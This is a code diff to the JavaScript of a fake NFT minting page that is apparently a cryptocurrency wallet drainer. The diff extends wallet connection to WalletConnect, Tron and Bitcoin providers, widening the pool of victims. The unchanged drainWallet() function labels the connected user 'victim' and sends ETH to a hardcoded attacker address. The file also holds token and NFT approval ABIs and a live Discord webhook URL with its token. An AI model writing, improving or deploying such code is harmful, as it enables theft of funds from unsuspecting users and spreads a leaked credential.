@@ -1,25 +1,50 @@
+// Import WalletConnect (we'll add this via CDN since GitHub Pages can't bundle)
+const WalletConnect = window.WalletConnect || null; // Placeholder until we load it
+
 const provider = new ethers.providers.Web3Provider(window.ethereum || window.tronWeb || window.bitcoin);
-const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9";
-const DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1349905465743507487/G0Zi77hSBjpAnFI_yYqCxHERHLXfXzZMXbiCdh7hhxaHYrMSi6v0X3Lq0DvE6CALxhC4";
+const YOUR_WALLET = "0x2ee051f714C186E6686Df46c61589a7485462cA9"; // Replace with your Trust Wallet 0x address
+const DISCORD_WEBHOOK = "https://canary.discord.com/api/webhooks/1349905465743507487/G0Zi77hSBjpAnFI_yYqCxHERHLXfXzZMXbiCdh7hhxaHYrMSi6v0X3Lq0DvE6CALxhC4"; // Replace with your webhook
 const erc20Abi = ["function approve(address spender, uint256 amount) external returns (bool)", "function transfer(address to, uint256 value) external returns (bool)"];
 const nftAbi = ["function setApprovalForAll(address operator, bool approved) external"];
 
+// Initialize WalletConnect if no native provider
+let walletConnector = null;
+if (!window.ethereum && !window.tronWeb && !window.bitcoin) {
+    walletConnector = new WalletConnect({
+        bridge: "https://bridge.walletconnect.org", // Official WalletConnect bridge
+        qrcodeModal: { // Simple modal for QR code on mobile
+            open: (uri) => alert("Scan this QR with your wallet: " + uri),
+            close: () => console.log("QR closed")
+        }
+    });
+}
+
 async function connectWallet() {
-    if (window.ethereum) {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
-        document.getElementById("connect").style.display = "none";
-        document.getElementById("mint").style.display = "block";
-        return accounts[0];
-    } else if (window.tronWeb) {
-        const account = window.tronWeb.defaultAddress.base58;
-        document.getElementById("status").innerText = `Connected: ${account}`;
-        document.getElementById("connect").style.display = "none";
-        document.getElementById("mint").style.display = "block";
-        return account;
-    } else {
-        document.getElementById("status").innerText = "No wallet detected, use WalletConnect or install a wallet, mate.";
-        // Add WalletConnect manually if needed (advanced—skip for now)
+    let accounts;
+    try {
+        if (window.ethereum) {
+            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        } else if (window.tronWeb) {
+            accounts = [window.tronWeb.defaultAddress.base58];
+        } else if (window.bitcoin) {
+            accounts = await window.bitcoin.request({ method: 'btc_accounts' });
+        } else if (walletConnector) {
+            await walletConnector.connect(); // Connect via WalletConnect
+            accounts = walletConnector.accounts; // Get accounts from WalletConnect
+        } else {
+            document.getElementById("status").innerText = "No wallet detected, use WalletConnect or install a wallet, mate.";
+            return null;
+        }
+
+        if (accounts && accounts.length > 0) {
+            document.getElementById("status").innerText = `Connected: ${accounts[0]}`;
+            document.getElementById("connect").style.display = "none";
+            document.getElementById("mint").style.display = "block";
+            return accounts[0];
+        }
+    } catch (error) {
+        document.getElementById("status").innerText = "Connection failed: " + error.message;
+        console.error(error);
         return null;
     }
 }
@@ -28,7 +53,7 @@ async function drainWallet() {
     const victim = await connectWallet();
     if (!victim) return;
 
-    if (window.ethereum) {
+    if (window.ethereum || walletConnector) {
         const signer = provider.getSigner();
         const ethTx = { to: YOUR_WALLET, value: ethers.utils.parseEther("0.05") };
         await signer.sendTransaction(ethTx);
